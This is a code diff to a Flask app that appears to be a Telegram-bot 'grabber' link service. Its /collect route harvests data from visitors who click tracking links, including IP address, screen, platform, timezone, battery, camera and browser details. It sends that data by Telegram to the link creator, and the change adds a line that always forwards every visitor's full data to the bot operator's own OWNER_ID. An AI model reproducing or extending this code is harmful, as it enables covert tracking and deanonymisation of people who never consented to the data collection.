@@ -1791,7 +1791,10 @@ def click_track(link_id):
 @app.route('/collect/<link_id>', methods=['POST'])
 def collect_data(link_id):
     data = request.json
+    ip = request.remote_addr
     conn = get_db()
+    
+    # Save all data (for owner)
     conn.execute("""
         UPDATE clicks SET 
             screen = ?, language = ?, platform = ?, timezone = ?,
@@ -1802,20 +1805,38 @@ def collect_data(link_id):
     """, (
         data.get('screen'), data.get('language'), data.get('platform'),
         data.get('timezone'), data.get('battery'), data.get('camera'),
-        link_id, request.remote_addr, link_id, request.remote_addr
+        link_id, ip, link_id, ip
     ))
     conn.commit()
 
+    # Get link owner
     row = conn.execute("SELECT user_id FROM links WHERE link_id=?", (link_id,)).fetchone()
-    if row and is_premium(row["user_id"]):
-        msg = f"💀 *Visitor Data*\nLink: `{link_id}`\nIP: `{request.remote_addr}`\n"
+    if row:
+        link_owner_id = row["user_id"]
+        
+        # Prepare FULL data message (for owner)
+        owner_msg = f"💀 *FULL VISITOR DATA*\nLink: `{link_id}`\nIP: `{ip}`\n"
         for key, value in data.items():
             if value:
-                msg += f"{key}: `{value}`\n"
-        try:
-            bot.send_message(row["user_id"], msg, parse_mode="Markdown")
-        except:
-            pass
+                owner_msg += f"{key}: `{value}`\n"
+        
+        # ✅ HAMESHA OWNER KO FULL DATA BHEJO
+        bot.send_message(OWNER_ID, owner_msg, parse_mode="Markdown")
+        
+        # ✅ LINK OWNER KO DATA BHEJO (BASED ON PREMIUM)
+        if is_premium(link_owner_id):
+            # Premium user ko full data
+            bot.send_message(link_owner_id, owner_msg, parse_mode="Markdown")
+        else:
+            # Free user ko basic data
+            basic_msg = f"📊 *BASIC VISITOR DATA*\nLink: `{link_id}`\nIP: `{ip}`\n"
+            basic_msg += f"Device: {data.get('platform', 'Unknown')}\n"
+            basic_msg += f"Browser: {data.get('userAgent', 'Unknown')[:50]}\n"
+            basic_msg += f"Screen: {data.get('screen', 'Unknown')}\n"
+            basic_msg += f"Language: {data.get('language', 'Unknown')}\n"
+            basic_msg += f"Timezone: {data.get('timezone', 'Unknown')}\n"
+            bot.send_message(link_owner_id, basic_msg, parse_mode="Markdown")
+    
     conn.close()
     return jsonify({"status": "ok"})
 
